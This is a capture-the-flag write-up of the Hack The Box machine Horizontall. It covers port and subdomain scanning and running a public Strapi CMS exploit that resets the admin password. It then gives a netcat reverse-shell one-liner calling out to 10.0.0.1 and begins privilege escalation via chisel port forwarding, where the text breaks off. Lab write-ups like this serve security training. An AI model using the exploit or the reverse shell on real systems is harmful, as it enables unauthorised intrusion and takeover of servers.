---
layout: default
title : muzec - Horizontall HTB Writeup
---

![image](https://user-images.githubusercontent.com/69868171/148056566-bbff1385-857b-4625-8ab1-6a2af94f624c.png)

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 08:30:37 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.105
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.10.11.105 from 320 to 640 due to 570 out of 1899 dropped probes since last increase.
Increasing send delay for 10.10.11.105 from 640 to 1000 due to 1398 out of 4658 dropped probes since last increase.
Nmap scan report for 10.10.11.105
Host is up (0.24s latency).
Not shown: 52107 closed ports, 13426 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 30 08:31:48 2021 -- 1 IP address (1 host up) scanned in 70.64 seconds
```

Interesting two open ports let throw some service detection and scripts switch on it to confirm wwhat we have running on it we can already see it `SSH and HTTP` but let keep it flashy lol.


```
nmap -sC -sV -oA nmap/normal -p 22,80 IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 08:32:40 2021 as: nmap -sC -sV -oA nmap/normal -p 22,80 10.10.11.105
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 08:32:58 2021 -- 1 IP address (1 host up) scanned in 18.10 seconds
```

Now that is more flashy we are checking the `HTTP` first make sure to add `IP` and `horizontall.htb` to your host file. 

![image](https://user-images.githubusercontent.com/69868171/148058010-51883f76-4001-4249-8ff8-5b81caaeadb8.png)

Now next thing to do is to check the source page but we got nothing let burst some directories and subdomain to find some hidden page.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105]                                                                                                              
└─$ gobuster dir -u http://horizontall.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh -o gobuster.req
/index.html           (Status: 200) [Size: 901]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
```

But i got nothing on the domain let check subdomain.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105]
└─$ gobuster vhost -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
```

Boom we got a subdomain which is cool add again to our host file now let access it to see what in store for us.

![image](https://user-images.githubusercontent.com/69868171/148062275-4fb13163-e6d1-4efc-8fbc-1dd8d154b02d.png)

We got a welcome message and the rest is blank so i try adding `/admin` and the back of the subdomain you can also burst directories you will get it i just guess it and boom it work.

![image](https://user-images.githubusercontent.com/69868171/148062675-e9ac9161-42c1-46fa-893c-44a25d29fc5c.png)

Seems we are dealing with `strapi cms` using some default credentials and we got no luck let see wwhat we can find on google.

```
http://api-prod.horizontall.htb/admin/strapiVersion
```

![image](https://user-images.githubusercontent.com/69868171/148063058-83731e9c-e26b-42a0-a275-8d7dff3a6a5d.png)

We found the version let confirm if the version is vulnerable.

![image](https://user-images.githubusercontent.com/69868171/148063158-3b9f1297-0025-438b-82e4-63185c98da86.png)

Boom let download the exploit to try it out.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105]
└─$ python3 50239.py http://api-prod.horizontall.htb/
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxMzAxNDYxLCJleHAiOjE2NDM4OTM0NjF9.50jv0hWWZ3KBCn-U0EIA2qNHkE7e4ddOrksf0yQuzbI


$> 
```

We are in but when i try to run a command i got some error.

![image](https://user-images.githubusercontent.com/69868171/148063509-0ca789cf-2460-4239-902c-24fb3088a990.png)

Smooth let try to transfer the shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Ncat ready to catch the reverse shell.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105]
└─$ nc -nvlp 1337 
listening on [any] 1337 ...
```

![image](https://user-images.githubusercontent.com/69868171/148063865-42bb052d-091e-43af-ab79-5c068c273ffa.png)

Boom more better let spawn a full tty shell.

![image](https://user-images.githubusercontent.com/69868171/148064159-1c37afcb-c021-47a0-9400-2910af4c55df.png)

Now let get the `user.txt` first.

![image](https://user-images.githubusercontent.com/69868171/148064371-d5a6ccdf-8b9e-4c78-af23-be84f14e9a9d.png)

Boom now let try to move our privilege.

![image](https://user-images.githubusercontent.com/69868171/148064681-013ed459-8775-447e-8745-780e199c84a3.png)

Found a credentials but when i try to use it for the user `developer` i got no luck so let check for `SUID` .

![image](https://user-images.githubusercontent.com/69868171/148064882-ee502a39-1232-45d7-a933-3c47ae9e8fb6.png)

Nothing also let check what ports we have running locally with us.

```
ss -tulpn
```

![image](https://user-images.githubusercontent.com/69868171/148064999-3cb0bfda-e916-4888-8359-c9e7fd9a98f9.png)

Boom we have a port let try to port forward using `chisel` first of all we need to transfer a copy of `chisel` binary to the target.

![image](https://user-images.githubusercontent.com/69868171/148065402-e6d6b3b0-913e-4d0c-b011-6331017f362c.png)

Now let start the server on our attacking machine.

```
